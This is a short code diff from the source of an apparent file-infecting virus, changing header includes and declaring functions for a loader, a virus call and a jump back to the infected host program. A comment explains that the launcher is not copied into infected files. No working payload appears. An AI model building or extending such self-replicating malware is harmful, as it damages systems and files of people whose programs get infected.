@@ -1,15 +1,19 @@
 
 #include "syscall.h"
 #include "virus.h"
-#include "loader.h"
+#include "virus_header.h"
+
+void	virus_header_struct(void);
+void	loader_entry(void);
+void	call_virus(void);
+void	jump_back_to_client(void);
+void	loader_exit(void);
 
 /*
 ** _start is the launcher function of the virus
 **   - it is launched instead of the loader for the first run
 **   - it is NOT copied into infected files (unlike the loader and virus)
 */
-
-extern size_t _full_virus_size;
 
 void	_start(void)
 {
